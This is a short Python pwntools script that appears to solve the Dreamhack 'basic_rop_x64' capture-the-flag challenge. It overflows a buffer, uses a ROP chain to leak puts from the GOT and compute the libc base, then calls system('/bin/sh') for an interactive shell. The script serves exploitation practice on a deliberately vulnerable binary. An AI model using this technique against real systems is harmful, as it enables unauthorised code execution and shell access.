#!/usr/bin/env python3

from pwn import *

PORT =  22915
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./basic_rop_x64_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x400819
            b*0x4007f8
            c
            set follow-fork-mode parent
            ''')
        input()

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()
# GDB()

pop_rdi = 0x00400883

offset = 0x48

pl = flat(
    b"A"*offset,
    pop_rdi,
    exe.got.puts,
    exe.plt.puts,
    exe.sym.main
    )

p.send(pl)
p.recvuntil(b"A"*64)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x80ed0
log.info("libc_base: " + hex(libc.address))

pl = flat(
    b"A"*offset,
    pop_rdi,
    next(libc.search(b"/bin/sh\0")),
    0x00000000004005a9,
    libc.sym.system
    )
p.send(pl)

p.interactive()
